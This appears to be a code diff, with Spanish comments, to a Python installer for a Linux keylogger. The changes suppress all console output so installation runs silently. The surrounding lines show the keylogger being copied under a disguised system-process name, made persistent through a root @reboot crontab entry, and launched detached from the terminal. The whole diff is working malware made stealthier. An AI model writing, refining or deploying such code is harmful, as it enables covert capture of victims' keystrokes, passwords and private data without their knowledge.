@@ -10,10 +10,10 @@ flag_file = "/var/log/installer_flag.txt"
 # ---- Instalación automática de dependencias ----
 def install_dependencies():
     try:
-        subprocess.check_call([os.sys.executable, "-m", "pip", "install", "pynput", "cryptography", "netifaces", "--break-system-packages"])
-        print("Dependencies installed successfully.")
+        subprocess.check_call([os.sys.executable, "-m", "pip", "install", "pynput", "cryptography", "netifaces", "--break-system-packages"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        #print("Dependencies installed successfully.")
     except Exception as e:
-        print(f"Failed to install dependencies: {e}")
+        #print(f"Failed to install dependencies: {e}")
         exit(1)
 
 install_dependencies()
@@ -101,16 +101,16 @@ with Listener(on_press=log_key_press) as listener:
         with open(dest_path, 'w') as f:
             f.write(keylogger_code)
         os.chmod(dest_path, 0o755)  # Asignar permisos de ejecución
-        print(f"Keylogger copied to {dest_path}.")
+        #print(f"Keylogger copied to {dest_path}.")
     except Exception as e:
-        print(f"Failed to copy the keylogger: {e}")
+        #print(f"Failed to copy the keylogger: {e}")
         exit(1)
 
 # Función para configurar el script en el arranque del sistema
 def setup_autostart():
     with open('/etc/crontab', 'a') as crontab:
         crontab.write("@reboot root /usr/local/bin/linux_system_process.py\n")
-    print("Autostart configured successfully.")
+    #print("Autostart configured successfully.")
 
 # Función para verificar si el script ya fue ejecutado
 def check_flag():
@@ -122,9 +122,9 @@ def create_flag():
         with open(flag_file, 'w') as f:
             f.write("Installation complete")
         os.chmod(flag_file, 0o600)  # Cambiar permisos de la flag para que sólo root pueda leer/escribir
-        print(f"Flag created at {flag_file}.")
+        #print(f"Flag created at {flag_file}.")
     except Exception as e:
-        print(f"Failed to create flag: {e}")
+        #print(f"Failed to create flag: {e}")
         exit(1)
 
 
@@ -140,14 +140,14 @@ def execute_keylogger_immediately():
             preexec_fn=os.setpgrp  # Desvincular del terminal
         ))
         keylogger_thread.start()
-        print("Keylogger executed immediately.")
+        #print("Keylogger executed immediately.")
     except Exception as e:
-        print(f"Failed to execute the keylogger: {e}")
+        #print(f"Failed to execute the keylogger: {e}")
 
 # ---- Instalación ----
 # 1. Verificar si ya se ejecutó previamente (flag)
 if check_flag():
-    print("Installation has already been completed. Exiting.")
+    #print("Installation has already been completed. Exiting.")
     exit(0)
 
 # 2. Verificar permisos de root
@@ -168,4 +168,4 @@ create_flag()
 # 7. Ejecutar el keylogger inmediatamente después de la instalación
 execute_keylogger_immediately()
 
-print("Installation complete. The keylogger will run on system startup and has been executed.")
+#print("Installation complete. The keylogger will run on system startup and has been executed.")
